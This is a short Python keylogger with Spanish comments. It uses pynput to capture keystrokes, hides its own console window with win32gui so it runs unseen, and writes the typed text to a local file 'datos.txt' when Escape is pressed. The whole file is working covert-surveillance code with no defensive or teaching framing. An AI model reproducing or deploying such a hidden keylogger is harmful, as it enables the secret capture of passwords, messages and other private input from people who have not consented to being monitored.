import pynput.keyboard #importamos modulo y clase
import time
import win32console
import win32gui

ventana = win32console.GetConsoleWindow() #obtenemos la ventana
win32gui.ShowWindow(ventana,0) #ocultamos la ventana en segundo plano

log_file = open("datos.txt","w+") 

def presion(key):            
	key1 = convertir(key)
	if key1 == "Key.esc":
		print("saliendo")
		imprimir()
		return  False
	elif key1 == "Key.space":
		lista_tecla.append(" ")
	elif key1 == "Key.enter":
		lista_tecla.append("\n")
	elif key1 == "Key.backspace":
		pass
	elif key1 == "Key.tab":
		pass
	elif key1 == "Key.shift":
		pass
	else:
		lista_tecla.append(key1)

def imprimir():  
	teclas = "".join(lista_tecla)
	log_file.write(teclas)
	log_file.write("\n")
	log_file.close()
	


def convertir(key):
	if isinstance(key,pynput.keyboard.KeyCode):
		return key.char
	else:
		return str(key)

lista_tecla = [] #guardando las teclas

#inicio del programa ---le asignamos a la variable "listen" el codigo para iniciar el programa
with pynput.keyboard.Listener(on_press = presion) as listen:
	listen.join()


